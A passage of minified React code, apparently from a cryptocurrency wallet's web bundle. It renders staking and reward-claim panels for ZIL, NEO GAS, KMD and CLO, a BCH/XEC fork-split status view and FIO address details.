                    uuid: t.uuid,
                    history: a
                })
            }, "Withdraw"))), !u && O.createElement(O.Fragment, null, O.createElement("br", null), O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/staking-zil?walletFrom=${t.uuid}`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Stake")), O.createElement("br", null), O.createElement("br", null)), O.createElement("a", {
                href: "https://support.guarda.com/earn-rewards/zilliqa-zil-staking",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "How to stake Zilliqa", O.createElement("img", {
                src: Bp,
                className: UI,
                alt: ""
            }))) : null : O.createElement(loader, {
                visible: !0,
                width: 30,
                className: $I
            })
        }
          , eP = withSettingsDisablement(ZilStakingPanel)
          , tP = "gas-claim-panel_loader_1shwL"
          , aP = "gas-claim-panel_loadingStatus_33LSo"
          , nP = "gas-claim-panel_success_2LMsA"
          , rP = "gas-claim-panel_error_1TRqh"
          , lP = "gas-claim-panel_iconNetTab_1c-9_"
          , sP = "gas-claim-panel_userSelect_1FifK";
        function NeoGasClaim(e) {
            let {wallet: t} = e;
            const [a,n] = (0,
            O.useState)(void 0)
              , [r,l] = (0,
            O.useState)(!1)
              , [s,i] = (0,
            O.useState)(!1)
              , [o,c] = (0,
            O.useState)(!1)
              , {convertToFiat: u} = useConverter()
              , d = t.subWallets.find((e => "gas" === e.currency.toLowerCase())) || t;
            (0,
            O.useEffect)(( () => {
                async function loadInformation() {
                    try {
                        const {data: e} = await Jf().get(`https://neoblockexplorer.org/api/main_net/v1/get_unclaimed/${t.address}`);
                        n(e.unclaimed)
                    } catch (e) {}
                }
                loadInformation()
            }
            ), [t.address]);
            async function handleClaimGas() {
                c(!0);
                l(!1);
                i(!1);
                const e = await Se.Z.getApiByCurrency("neo")
                  , a = await e.claimGas({
                    address: t.address,
                    privateKey: t.privateKey
                });
                l(!!a.error);
                i(!a.error);
                c(!1);
                if (!a.error) {
                    cc.$.send(cc.d.CLAIM_SEND, "gas");
                    n(0)
                }
            }
            return null === a ? O.createElement(LoaderDots, {
                visible: !0
            }) : O.createElement(O.Fragment, null, "Unclaimed Gas: ", O.createElement("b", {
                className: sP
            }, (0,
            Ko.yF)(a, 12), " GAS"), " ", O.createElement(jA, {
                value: u(a, d)
            }), O.createElement("br", null), O.createElement("br", null), !t.isWatchOnly && O.createElement(O.Fragment, null, O.createElement(Yl, {
                id: "claimNeoGas",
                color: "blue",
                onClick: handleClaimGas,
                disabled: "0" === a
            }, r ? "Try again" : "Claim now"), O.createElement("br", null), O.createElement("br", null)), o && O.createElement(O.Fragment, null, O.createElement("div", {
                className: aP
            }, O.createElement("span", {
                className: tP
            }, "Claiming"), O.createElement(LoaderDots, {
                visible: !0
            }))), s && O.createElement(O.Fragment, null, O.createElement("div", {
                className: Ht()(aP, nP)
            }, O.createElement("span", null, "Successfully claimed GAS")), O.createElement("p", null, "Make any NEO transaction to activate Claiming function.")), r && O.createElement(O.Fragment, null, O.createElement("div", {
                className: Ht()(aP, rP)
            }, O.createElement("span", null, "Failed claim GAS")), O.createElement("p", {
                className: rP
            }, "Make any NEO transaction to activate Claiming function.")))
        }
        NeoGasClaim.propTypes = {
            wallet: as().object
        };
        const iP = "kmd_wrapper_1v-8k main_block_15zml"
          , oP = "kmd_titleSection_2zc81"
          , cP = "kmd_claimButton_4sEFB styles_dashedNormal_xEvl8"
          , uP = "kmd_claimSuccess_rgeU7"
          , dP = "kmd_claimError_3x1Y9"
          , mP = "kmd_claimNotAvailable_3Qx4M"
          , pP = "kmd_blockReward_lS9xR"
          , fP = "kmd_wrapperLoader_1FofU"
          , EP = "kmd_notify_-O6TP"
          , hP = "kmd_buttonLink_3muuJ"
          , gP = "kmd_external_2QkxM"
          , yP = "kmd_userSelect_ZWwVK"
          , vP = "kmd_loader_2TJn0"
          , _P = 0
          , wP = 1
          , bP = 2
          , kP = 3
          , KmdClaimBlock = e => {
            let {wallet: t} = e;
            const a = (0,
            $.I0)()
              , n = (0,
            $.v9)(ax)
              , r = undefined
              , l = (0,
            $.v9)(cx)({
                uuid: t.uuid
            })
              , [s,i] = (0,
            O.useState)(!0)
              , [o,c] = (0,
            O.useState)(0)
              , [u,d] = (0,
            O.useState)(null)
              , {convertToFiat: m} = useConverter()
              , p = !n || "STAKING_INFO_SUCCESS" !== n.fetchStatus
              , f = t.watchOnly
              , E = (0,
            O.useMemo)(( () => O.createElement(O.Fragment, null, O.createElement("br", null), O.createElement("br", null), O.createElement("a", {
                className: hP,
                href: "https://support.guarda.com/earn-rewards/staking-komodo-and-claiming-rewards",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "Get a reward for staking KMD", O.createElement("img", {
                src: Bp,
                className: gP,
                alt: ""
            })))), [])
              , handleClaim = async () => {
                i(!0);
                const e = await Se.Z.getApiByCurrency("kmd")
                  , a = await e.claimReward(t);
                i(!1);
                if (a && a.error) {
                    c(2);
                    setTimeout(( () => c(0)), 2e3)
                } else {
                    d("0");
                    cc.$.send(cc.d.CLAIM_SEND, "kmd");
                    c(1)
                }
            }
              , h = {
                3: O.createElement(O.Fragment, null, O.createElement("span", null, "Staking starts automatically if you have 10 KMD on the balance. Claim your reward periodically."), E),
                0: O.createElement(O.Fragment, null, O.createElement("span", {
                    className: cP,
                    onClick: handleClaim
                }, "Claim now"), E),
                1: O.createElement(O.Fragment, null, O.createElement("span", {
                    className: uP
                }, "Successfully claimed your reward!"), E),
                2: O.createElement(O.Fragment, null, O.createElement("span", {
                    className: dP
                }, "Failed to claim reward."), E)
            };
            (0,
            O.useEffect)((function fetchStakingInfo() {
                if (p && t && "string" == typeof t.uuid && "privateKey"in t) {
                    const e = {
                        uuid: t.uuid,
                        currency: t.currency,
                        address: t.address,
                        balance: t.balance,
                        privateKey: t.privateKey
                    };
                    a(lb.fetchActiveStakingInfoByWallet({
                        wallet: e,
                        validators: []
                    }))
                }
            }
            ), [a, t, p]);
            (0,
            O.useEffect)((function clearStore() {
                return () => {
                    i(!0);
                    a(lb.setClearStore())
                }
            }
            ), [t.uuid]);
            (0,
            O.useEffect)((function updateBalance() {
                !t || t.isNewToken || t.isNewWallet || a(updateBalanceByWallet(t, !1))
            }
            ), [a, t]);
            (0,
            O.useEffect)((function useFetchedStakingInfo() {
                if (n) {
                    const {totalRewards: e} = n.dto;
                    e && d(e.toString());
                    i(!1)
                }
            }
            ), [n]);
            (0,
            O.useEffect)((function useFetchedStakingInfo() {
                if (l) {
                    const {totalRewards: e} = l.dto;
                    e && d(e.toString())
                }
            }
            ), [l]);
            (0,
            O.useEffect)((function setStatusForCorrectView() {
                (0,
                Ko.gt)(u, 0) && c(0);
                (null === u || (0,
                Ko.eq)(u, 0)) && c(3)
            }
            ), [u]);
            return O.createElement("div", {
                className: pP
            }, s && !l ? O.createElement(loader, {
                visible: !0,
                width: 30,
                className: vP
            }) : O.createElement(O.Fragment, null, O.createElement(loader, {
                visible: s,
                width: 30,
                className: vP
            }), O.createElement("span", null, "Reward: ", O.createElement("b", {
                className: yP
            }, (0,
            Ko.yF)(u || 0, 12), " KMD"), " ", O.createElement(jA, {
                value: m(u || 0, t)
            })), 2 === o ? O.createElement("div", null, h[2]) : !f && O.createElement("div", null, h[o])))
        }
          , SP = withSettingsDisablement(KmdClaimBlock)
          , CP = O.memo((e => {
            let {walletUUID: t, children: a} = e;
            const n = (0,
            j.k6)()
              , handleDeposit = () => {
                n.push({
                    pathname: (0,
                    M.RU)("/staking-clo/staking"),
                    search: objectToString({
                        walletFrom: t
                    })
                })
            }
            ;
            return O.createElement(Yl, {
                color: "blue",
                onClick: handleDeposit
            }, a)
        }
        ))
          , NP = {
            wrapper: "clo_wrapper_3MCoN main_block_15zml",
            titleSection: "clo_titleSection_1UucS",
            spanRight: "clo_spanRight_2oCKa",
            error: "clo_error_1ieic",
            info: "clo_info_245Ng",
            warning: "clo_warning_1_2eo",
            rowButton: "clo_rowButton_1j35e",
            row: "clo_row_11DU3",
            value: "clo_value_2FBC-",
            popup: "clo_popup_2q2d-",
            buttonLink: "clo_buttonLink_pob27",
            external: "clo_external_1MTdh",
            blockHeight: "clo_blockHeight_w55dz",
            userSelect: "clo_userSelect_2xK6J",
            loader: "clo_loader_2AEgz"
        }
          , TP = O.memo((e => {
            let {title: t, description: a, isVisible: n, children: r} = e;
            return n && (t || a) ? O.createElement("div", {
                className: NP.row
            }, t && O.createElement("div", null, t), a && O.createElement("div", {
                className: NP.value
            }, a), !a && !!O.Children.count(r) && O.createElement("div", {
                className: NP.value
            }, r)) : null
        }
        ))
          , stakingSelector = e => e.staking
          , prepareStakeInfo = e => {
            const t = [];
            e.dto.length && Array.isArray(e.dto) && e.dto.forEach((e => {
                const a = (0,
                Ko.yF)(null == e ? void 0 : e.amount)
                  , n = "up to 7.8% (float)"
                  , r = (0,
                Ko.yF)(e.reward, 8)
                  , l = e.endTime ? new Date(1e3 * e.endTime) : e.time ? 1e3 * (e.time + 2332800) : null
                  , s = l ? date_format(l) : null
                  , i = e.time ? date_format(new Date(1e3 * e.time)) : null
                  , o = e.contractAddress ? e.contractAddress : null
                  , c = e.contractVersion ? e.contractVersion : null;
                t.push({
                    annualYield: n,
                    reward: r,
                    firstRewardDate: s,
                    stakedAt: i,
                    amount: a,
                    contractAddress: o,
                    contractVersion: c
                })
            }
            ));
            return t
        }
          , AP = (0,
        _t.P1)((e => {
            let {amount: t, time: a, endTime: n} = e;
            return {
                amount: t,
                time: a,
                endTime: n
            }
        }
        ), (e => {
            let {amount: t, time: a, endTime: n} = e;
            return n ? t > 0 && 1e3 * n > Date.now() : t > 0 && (!a || 1e3 * (a + 2332800) > Date.now())
        }
        ))
          , findListItem = e => t => t.meta.currency === e.currency && t.meta.address === e.address
          , selectStakingList = e => e.list
          , selectWallet = (e, t) => t
          , xP = (0,
        _t.P1)([selectStakingList, selectWallet], ( (e, t) => {
            if (!e)
                return null;
            const a = e.findIndex(findListItem(t));
            return -1 !== a ? e[a] : null
        }
        ))
          , IP = (0,
        _t.P1)(xP, (e => null == e ? void 0 : e.status))
          , PP = (0,
        _t.P1)(xP, (e => null == e ? void 0 : e.dto))
          , LP = (0,
        _t.P1)(xP, (e => e ? prepareStakeInfo(e) : null))
          , FP = (0,
        _t.P1)(xP, (e => {
            var t;
            return !e || (null === (t = e.dto) || void 0 === t ? void 0 : t.amount) <= 0 ? e : {
                ...e,
                data: prepareStakeInfo(e)
            }
        }
        ))
          , WP = (0,
        _t.P1)((e => e.notifications.reward), (e => ({
            hasErrors: (null != e ? e : []).some((e => e.type === ww.error)),
            notices: null != e ? e : []
        })))
          , RP = O.memo((e => {
            let {title: t, description: a, children: n} = e;
            return O.createElement(O.Fragment, null, O.createElement("h3", null, t), O.createElement("p", {
                style: {
                    whiteSpace: "pre-line"
                }
            }, a), n)
        }
        ))
          , BP = O.memo((e => {
            let {isLoading: t, children: a} = e;
            return t ? O.createElement(LoaderDots, {
                visible: !0
            }) : O.createElement(O.Fragment, null, a)
        }
        ))
          , useStakingDialog = e => {
            const [t,a] = O.useState(!1)
              , n = O.useCallback((e => () => a(e)), [a])
              , r = O.useCallback((a => {
                let {onConfirm: r, isLoading: l=!1, isBlocked: s=!1, children: i} = a;
                const {title: o, description: c} = e;
                return O.createElement(aa, {
                    onClose: n(!1),
                    visible: t,
                    width: 450
                }, O.createElement("div", {
                    className: NP.popup
                }, O.createElement(RP, {
                    title: o,
                    description: c
                }, i), O.createElement(BP, {
                    isLoading: l
                }, O.createElement(Yl, {
                    disabled: s,
                    color: "blue",
                    onClick: r
                }, null == e ? void 0 : e.buttonText[0]))))
            }
            ), [t, e, n]);
            return {
                isOpen: t,
                toggleDialog: n,
                Dialog: r
            }
        }
        ;
        let OP;
        !function(e) {
            e.claim = "claim";
            e.withdraw = "withdraw"
        }(OP || (OP = {}));
        const DP = new Map([[OP.withdraw, {
            title: "Release the initial stake",
            description: "You are going to withdraw not only rewards, but all your staking amount. After that the rewarding will be cancelled.\n If you are sure you want stop staking, please confirm the release staking.",
            buttonText: ["Release staking and withdraw all"]
        }], [OP.claim, {
            title: "Claim the reward",
            description: "You are going to withdraw your reward. You will get the amount of reward, but your stake will continue generating rewards.\n If you want to stop staking and release the initial stake please choose another option.\n If you want to withdraw reward only please confirm claim.\n",
            buttonText: ["Withdraw the reward"]
        }]])
          , MP = O.memo((e => {
            let {isVisible: t, isPendingTX: a, type: n, onClick: r, onConfirm: l} = e;
            const [s] = O.useState(DP.get(n))
              , i = (0,
            $.v9)(stakingSelector)
              , {isRewardTxFetching: o} = i
              , {notices: c, hasErrors: u} = WP(i)
              , {Dialog: d, toggleDialog: m} = useStakingDialog(s)
              , handleClick = () => {
                m(!0)();
                r && r()
            }
            ;
            return O.createElement(O.Fragment, null, O.createElement(d, {
                onConfirm: l,
                isBlocked: u || a,
                isLoading: o
            }, c.map(( (e, t) => {
                let {message: a, type: n, property: r} = e;
                return O.createElement("div", {
                    key: `${r}-${n}-${t}`,
                    className: n && NP[n]
                }, a)
            }
            ))), t && O.createElement("button", {
                role: "link",
                type: "button",
                className: "dashedNormal",
                onClick: handleClick
            }, n))
        }
        ));
        MP.displayName = "CloRewardButton";
        const clo_staking_prepareStakeInfo = e => {
            const t = [];
            e.length && Array.isArray(e) && e.forEach((e => {
                var a;
                const n = (0,
                Ko.yF)(null == e ? void 0 : e.stakedAmount)
                  , r = "up to 7.8% (float)"
                  , l = (0,
                Ko.yF)(e.rewardAmount, 8)
                  , s = e.frozenUntil ? new Date(1e3 * e.frozenUntil) : e.stakedAt ? 1e3 * (e.stakedAt + 2332800) : null
                  , i = s ? date_format(s) : null
                  , o = e.stakedAt ? date_format(new Date(1e3 * e.stakedAt)) : null
                  , c = null !== (a = e.validator) && void 0 !== a && a.address ? e.validator.address : "";
                t.push({
                    annualYield: r,
                    reward: l,
                    firstRewardDate: i,
                    stakedAt: o,
                    amount: n,
                    contractAddress: c
                })
            }
            ));
            return t
        }
          , UP = O.memo((e => {
            var t;
            let {wallet: a} = e;
            const {address: n, uuid: r, currency: l, privateKey: s, balance: i} = a
              , {convertToFiat: o} = useConverter()
              , c = (0,
            O.useMemo)(( () => ({
                address: n,
                uuid: r,
                currency: l,
                privateKey: s,
                balance: i
            })), [n, r, l, s, i])
              , u = (0,
            $.I0)()
              , d = (0,
            $.v9)(ax)
              , m = undefined
              , p = (0,
            $.v9)(cx)({
                uuid: a.uuid
            })
              , f = Boolean(!d && !p)
              , E = Boolean(!d && p)
              , isPendingTxCulc = e => {
                let {stakedAmount: t, stakedAt: a, frozenUntil: n} = e;
                return n ? t > 0 && 1e3 * n > Date.now() : t > 0 && (!a || 1e3 * (a + 2332800) > Date.now())
            }
              , h = (0,
            O.useMemo)(( () => d && d.dto ? d.dto : p && p.dto ? p.dto : void 0), [d, p])
              , g = (0,
            O.useMemo)(( () => {
                if (h && h.stakedValidators && "manyValidators"in h.stakedValidators) {
                    const e = {
                        isPendingTx: {}
                    };
                    h.stakedValidators.manyValidators.forEach((t => {
                        var a;
                        const n = null === (a = t.validator) || void 0 === a ? void 0 : a.address;
                        if (n) {
                            const a = isPendingTxCulc({
                                stakedAmount: t.stakedAmount,
                                stakedAt: t.stakedAt,
                                frozenUntil: t.frozenUntil
                            });
                            Object.assign(e.isPendingTx, {
                                [n]: a
                            })
                        }
                    }
                    ));
                    return e
                }
                return {
                    isPendingTx: !1
                }
            }
            ), [h])
              , y = (0,
            O.useMemo)(( () => {
                if (h && h.stakedValidators && "manyValidators"in h.stakedValidators)
                    return clo_staking_prepareStakeInfo(h.stakedValidators.manyValidators)
            }
            ), [h])
              , v = Boolean(!(null == y || !y.length))
              , _ = Boolean(null === (t = !(null == g || !g.isPendingTx)) || void 0 === t || t)
              , w = (0,
            O.useCallback)(( () => u(Uw(c))), [u, c])
              , b = Boolean(!d && a);
            (0,
            O.useEffect)((function fetchStakingInfo() {
                if (b && "string" == typeof a.uuid && "privateKey"in a) {
                    const e = {
                        uuid: a.uuid,
                        currency: a.currency,
                        address: a.address,
                        balance: a.balance,
                        privateKey: a.privateKey
                    };
                    u(lb.fetchActiveStakingInfoByWallet({
                        wallet: e,
                        validators: []
                    }))
                }
            }
            ), [b, u, a]);
            (0,
            O.useEffect)((function clearStore() {
                return () => {
                    u(lb.setClearStore())
                }
            }
            ), [a.uuid]);
            (0,
            O.useEffect)(( () => {
                (0,
                $.dC)(( () => {
                    u(Ww.visit(c));
                    u(Bw(c))
                }
                ));
                return () => {
                    u(Ww.exit(c))
                }
            }
            ), [u, c]);
            const k = (0,
            O.useCallback)((e => {
                Object.assign(c, {
                    contractAddress: e
                });
                u(Zw(c))
            }
            ), [u, c])
              , S = (0,
            O.useCallback)((e => {
                Object.assign(c, {
                    contractAddress: e
                });
                u(Hw(c))
            }
            ), [u, c]);
            return O.createElement("div", {
                className: NP.blockHeight,
                style: {
                    marginBottom: "10px"
                }
            }, f && O.createElement(loader, {
                visible: f,
                width: 30,
                className: NP.loader
            }), !f && !(null == y || !y.length) && (null == y ? void 0 : y.map(( (e, t) => {
                let {amount: n, annualYield: r, contractAddress: l, firstRewardDate: s, reward: i, stakedAt: c} = e;
                return O.createElement("div", {
                    key: c
                }, O.createElement(TP, {
                    isVisible: !0,
                    title: "Staked:"
                }, O.createElement(loader, {
                    visible: f,
                    width: 30,
                    className: NP.loader
                }), O.createElement(loader, {
                    visible: E,
                    width: 30,
                    className: NP.loader
                }), O.createElement("b", {
                    className: NP.userSelect
                }, f ? "" : n || 0, " ", "CLO"), " ", O.createElement(jA, {
                    value: o(+n || 0, a)
                }), O.createElement(MP, {
                    type: OP.withdraw,
                    isPendingTX: !!g && "boolean" != typeof (null == g ? void 0 : g.isPendingTx) && (null == g ? void 0 : g.isPendingTx[l]),
                    isVisible: !f && v && !!g && "boolean" != typeof (null == g ? void 0 : g.isPendingTx) && !(null != g && g.isPendingTx[l]),
                    onClick: w,
                    onConfirm: () => k(l)
                })), O.createElement("div", {
                    hidden: f
                }, O.createElement(TP, {
                    isVisible: _ && !!s,
                    title: O.createElement(O.Fragment, null, "Withdrawal date:", " ", O.createElement("b", null, s))
                }), O.createElement(TP, {
                    isVisible: v && l === Xo,
                    title: "Annual yield:",
                    description: r
                }), O.createElement(TP, {
                    isVisible: v,
                    title: "Staked at:",
                    description: c
                }), O.createElement(TP, {
                    isVisible: v,
                    title: "Rewards:"
                }, O.createElement("b", {
                    className: NP.userSelect
                }, i, " ", "CLO"), O.createElement(jA, {
                    value: o(+i, a)
                }), O.createElement(MP, {
                    type: OP.claim,
                    isPendingTX: !!g && "boolean" != typeof (null == g ? void 0 : g.isPendingTx) && (null == g ? void 0 : g.isPendingTx[l]),
                    isVisible: l === Xo && !!g && "boolean" != typeof (null == g ? void 0 : g.isPendingTx) && !(null != g && g.isPendingTx[l]) && Number(i) >= 0,
                    onClick: w,
                    onConfirm: () => S(l)
                })), O.createElement("span", null)), t !== y.length - 1 ? O.createElement("hr", {
                    style: {
                        margin: "5px 0 15px"
                    }
                }) : "")
            }
            ))), O.createElement("br", null), !f && y && O.createElement(O.Fragment, null, !y.length && O.createElement(O.Fragment, null, "Staked:", " ", O.createElement("b", null, "0 CLO"), O.createElement("br", null), O.createElement("br", null)), O.createElement("div", {
                className: NP.rowButton
            }, O.createElement(CP, {
                walletUUID: r
            }, "Stake")), O.createElement("a", {
                className: NP.buttonLink,
                href: "https://support.guarda.com/earn-rewards/cold-staking-callisto",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "Get a reward for staking CLO", O.createElement("img", {
                src: Bp,
                className: NP.external,
                alt: ""
            }))))
        }
        ));
        UP.displayName = "CloStakingPanel";
        const GP = withSettingsDisablement(UP)
          , VP = ee.P.create({
            name: "bch-splitter"
        })
          , KP = M.CM ? (0,
        bu.ZP)("bch-splitter-url") : null;
        KP && VP.log("now use api:", KP);
        const HP = "https://splitter.guarda.com"
          , zP = Jf().create({
            baseURL: `${KP || HP}/external`
        })
          , jP = {
            wrapper: "bch_wrapper_1KNYk main_block_15zml",
            inlineButtons: "bch_inlineButtons_1jyxU",
            titleBlock: "bch_titleBlock_5OOzs",
            contentBlock: "bch_contentBlock_RzwnY"
        };
        function WalletAddress(e) {
            const {wallet: t} = e;
            if (!t)
                return null;
            if (t.currency !== _e.ND.bch && t.currency !== _e.ND.xec)
                return null;
            const [a,n] = (0,
            O.useState)({});
            (0,
            O.useEffect)(( () => {
                async function fetchInfo() {
                    if (t && t.address)
                        try {
                            const {data: e} = await zP.get(`/invoice/${t.address}`);
                            n(e)
                        } catch (e) {}
                }
                fetchInfo()
            }
            ), [t]);
            return O.createElement("div", {
                className: jP.blockHeight
            }, !a && O.createElement(LoaderDots, {
                visible: !0
            }), (!1 === a.found || "CREATED" === a.status) && O.createElement(O.Fragment, null, O.createElement(label, null, "BCHN/ABC fork"), O.createElement("div", null, "After hardfork your address and balance have duplicated in ABC (XEC) / BCHN (BCH) networks. Any transaction will also get duplicated in both Networks."), O.createElement("br", null), O.createElement("br", null), !t.isWatchOnly && O.createElement("div", {
                className: jP.inlineButtons
            }, O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/bch-split?walletFrom=${(null == t ? void 0 : t.uuid) || ""}&currency=${(null == t ? void 0 : t.currency) || ""}`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Split address")))), a.found && O.createElement(O.Fragment, null, "CONFIRMED" === a.status && O.createElement(O.Fragment, null, O.createElement(label, null, "BCHN/ABC fork"), O.createElement("br", null), O.createElement("div", null, "Any transactions will still get duplicated in both Networks. Wait for the transaction to the BCH address (within 8 hours). After that, click Finish to complete the split"), O.createElement("br", null), O.createElement("br", null), O.createElement("div", null, "Split status: ", O.createElement("b", null, "ACTION REQUIRED")), O.createElement("br", null), O.createElement("br", null), !t.isWatchOnly && O.createElement("div", {
                className: jP.inlineButtons
            }, O.createElement(Y.OL, {
                to: `${(0,
                M.RU)()}/bch-split-complete/confirm?walletFrom=${(null == t ? void 0 : t.uuid) || ""}&currency=${(null == t ? void 0 : t.currency) || ""}`
            }, O.createElement(Yl, {
                color: "blue"
            }, "Complete split")))), ("PENDING" === a.status || "SENT" === a.status) && O.createElement(O.Fragment, null, O.createElement(label, null, "BCHN/ABC fork"), O.createElement("br", null), O.createElement("div", null, "Any transactions will still get duplicated in both Networks. Wait for the transaction to the BCH address (within 8 hours). After that, click Finish to complete the split"), O.createElement("br", null), "Split status: ", O.createElement("b", null, "IN PROGRESS")), "DONE" === a.status && O.createElement(O.Fragment, null, O.createElement(label, null, "BCHN/ABC fork"), "Split status: ", O.createElement("b", null, "DONE"))))
        }
        WalletAddress.propTypes = {
            wallet: as().object.isRequired
        };
        const basic_memo_wallet = e => {
            const t = e ? e.currency : ""
              , a = e ? e.address : "";
            return (0,
            O.useMemo)(( () => e), [t, a])
        }
          , LinkTargetBlank = e => O.createElement("a", {
            target: "_blank",
            rel: "noreferrer noopener",
            href: e.href
        }, e.icon && O.createElement("div", {
            dangerouslySetInnerHTML: {
                __html: e.icon
            },
            className: kk
        }), e.children, O.createElement("img", {
            src: Bp,
            className: Ck,
            alt: ""
        }));
        LinkTargetBlank.propTypes = {
            icon: as().string,
            children: as().node.isRequired,
            href: as().string.isRequired
        };
        const $P = LinkTargetBlank
          , ZP = {
            wrapper: "fio_wrapper_eHSEV main_block_15zml",
            informationBlock: "fio_informationBlock_2V6OX",
            informationWrapQR: "fio_informationWrapQR_25qEy",
            infoBlock: "fio_infoBlock_DvyJS",
            row: "fio_row_2vNlp",
            left: "fio_left_3DUwh",
            right: "fio_right_1qBFH",
            button: "fio_button_2lwmw",
            emptyInfoLink: "fio_emptyInfoLink_SNQxa",
            buttonWrapper: "fio_buttonWrapper_19HIO",
            iconExplorer: "fio_iconExplorer_3NAX_",
            newTab: "fio_newTab_1bk-8",
            walletNotification: "fio_walletNotification_28YDx",
            wrapperGiv: "fio_wrapperGiv_36OPA main_block_15zml",
            loadingWrapper: "fio_loadingWrapper_1ozvH",
            moreInfo: "fio_moreInfo_3kSQn",
            address: "fio_address_3zTKo",
            informationWrapAddress: "fio_informationWrapAddress_ruey7",
            expires: "fio_expires_2YQ47",
            expired: "fio_expired_2V39K",
            informationWrapButtons: "fio_informationWrapButtons_1s108",
            lastUpdateTime: "fio_lastUpdateTime_1brVR",
            watchOnly: "fio_watchOnly_190hg",
            fakeQRCode: "fio_fakeQRCode_1hr4a"
        };
        function FioGiv(e) {
            return "fio" !== e.wallet.currency ? null : O.createElement("div", {
                className: ZP.wrapperGiv
            }, O.createElement("div", {
                className: ZP.walletNotification
            }, "FIO Foundation welcomes new users with a limited address giveaway! Get your first FIO address", O.createElement("br", null), O.createElement("br", null), O.createElement("a", {
                href: `https://reg.fioprotocol.io/ref/guardafree?publicKey=${e.wallet.address}`,
                target: "_blank",
                rel: "noreferrer noopener"
            }, O.createElement(Yl, {
                color: "blue",
                id: "getFreeFio"
            }, "Get free FIO address")), O.createElement("br", null), O.createElement("br", null), O.createElement($P, {
                href: "https://support.guarda.com/assets/what-is-fio-protocol"
            }, "What is a FIO address and how does it work"), O.createElement("br", null)))
        }
        FioGiv.propTypes = {
            wallet: as().object.isRequired
        };
        let YP = !0;
        function FioAddressDetails(e) {
            const t = (0,
            j.k6)()
              , [a,n] = (0,
            O.useState)(null)
              , [r,l] = (0,
            O.useState)(null)
              , isValidToRun = () => e.wallet && "fio" === e.wallet.currency
              , s = r && r.data && r.data[0] ? r.data[0].fio_address : ""
              , i = basic_memo_wallet(e.wallet);
            (0,
            O.useEffect)(( () => {
                async function fetchAdapter() {
                    YP = !0;
                    const e = await Se.Z.getApiByWallet(i);
                    n(e)
                }
                isValidToRun() && fetchAdapter()
            }
            ), [i]);
            (0,
            O.useEffect)(( () => {
                const fetchWalletInfo = async () => {
                    const e = await a.requestFIONames({
                        address: i.address
                    });
                    if (e.fio_addresses && Array.isArray(e.fio_addresses) && e.fio_addresses[0]) {
                        YP = !1;
                        l({
                            data: e.fio_addresses,
                            found: !0
                        })
                    } else {
                        YP = !1;
                        l({
                            data: [],
                            found: !1
                        })
                    }
                }
                ;
                if (isValidToRun() && a) {
                    YP = !0;
                    fetchWalletInfo()
                }
            }
            ), [i, a]);
            if (!isValidToRun())
                return null;
            function getDeadlineDate() {
                const e = new Date(r.data[0].expiration);
                e.setMonth(e.getMonth() + 3);
                return date_format(e, "dd mmm yyyy, HH:MM:ss")
            }
            function isExpired() {
                const e = undefined;
                return new Date(r.data[0].expiration) < new Date
            }
            function goToManageAddresses() {
                t.push({
                    pathname: (0,
                    M.RU)("/fio/select-wallets"),
                    search: objectToString({
                        type: "update",
                        fioWallet: i.uuid,
                        fioWalletName: s
                    })
                })
            }
            return O.createElement(O.Fragment, null, !YP && O.createElement(O.Fragment, null, r && r.found && O.createElement("div", {
                className: ZP.wrapper
            }, O.createElement(label, {
                className: ZP.label
            }, "FIO address details"), O.createElement("div", {
                className: ZP.infoBlock
            }, O.createElement("div", {
                className: ZP.row
            }, O.createElement("div", {
                className: ZP.left
            }, "Public key:"), O.createElement("div", {
                className: ZP.right
            }, O.createElement(button_copy, {
                text: i.address
            }, (e => e ? "Address copied to clipboard" : i.address)), O.createElement("a", {
                href: `https://fio.bloks.io/key/${i.address}`,
                target: "_blank",
                rel: "noreferrer noopener",
                className: ZP.iconExplorer
            }, O.createElement("img", {
                src: Bp,
                className: ZP.newTab,
                alt: "Open block explorer"
            })))), O.createElement("div", {
                className: ZP.row
            }, O.createElement("div", {
                className: ZP.left
            }, "FIO address:"), O.createElement("div", {
                className: ZP.right
            }, O.createElement(button_copy, {
                text: s
            }, (e => e ? "Address copied to clipboard" : s)), O.createElement("a", {
                href: `https://fio.bloks.io/address/${s}`,
                target: "_blank",
                rel: "noreferrer noopener",
                className: ZP.iconExplorer
            }, O.createElement("img", {
                src: Bp,
                className: ZP.newTab,
                alt: "Open block explorer"
            })))), O.createElement("div", {
                className: ZP.row
            }, O.createElement("div", {
                className: ZP.left
            }, "Status:"), O.createElement("div", {
                className: ZP.right
            }, isExpired() ? `Blocked until ${getDeadlineDate()}. Payment required.` : "Active")), !i.isWatchOnly && O.createElement("div", {
                className: Ht()(ZP.row, ZP.buttonWrapper)
            }, O.createElement(Yl, {
                color: "light-blue",
                className: ZP.button,
                onClick: goToManageAddresses
            }, "Manage linked addresses"))), O.createElement("div", {
                className: ZP.emptyInfoLink
            }, O.createElement($P, {
                href: "https://support.guarda.com/assets/what-is-fio-protocol"
            }, "What is a FIO address and how does it work")))), r && !r.found && O.createElement(FioGiv, {
                wallet: i
            }))
        }
        FioAddressDetails.propTypes = {
            wallet: as().object.isRequired
        };
        function secondsToDateTime(e) {
            const t = Math.floor(e / 86400);
            if (t)
                return `${t} ${1 === t ? "day" : "days"}`;
            const a = Math.floor(e % 86400 / 3600);
            if (a)
                return `${a} ${1 === a ? "hour" : "hours"}`;
            const n = Math.floor(e % 3600 / 60) || 1;
            return `${n} ${1 === n ? "minute" : "minutes"}`
        }
        const qP = "xmr_fadeArrowFlipped_3lSyY"
          , XP = "xmr_fadeCalendar_3PMUZ"
          , QP = "xmr_fadeTextToCenter_38ohx"
          , JP = "xmr_FadeContentToCenter_2dD1a"
          , eL = "xmr_resyncLink_3qy27"
          , tL = "xmr_resyncLoader_XjBz1"
          , aL = "xmr_loader_3gJKs"
          , nL = "xmr_buttons_WMGIl"
          , rL = "xmr_ok_1O5-_"
          , lL = "xmr_notOk_2hDAB"
          , sL = "xmr_wrapper_gIFqU main_block_15zml"
          , iL = "xmr_block_1r5O-"
          , oL = "xmr_value_2DokR"
          , cL = "xmr_row_21PW1"
          , uL = "xmr_desc_1Nj4A"
          , dL = "xmr_blockHeight_2jOHb"
          , mL = "xmr_inputWrapper_35KDE"
          , pL = "xmr_errorWrapper_g45mF"
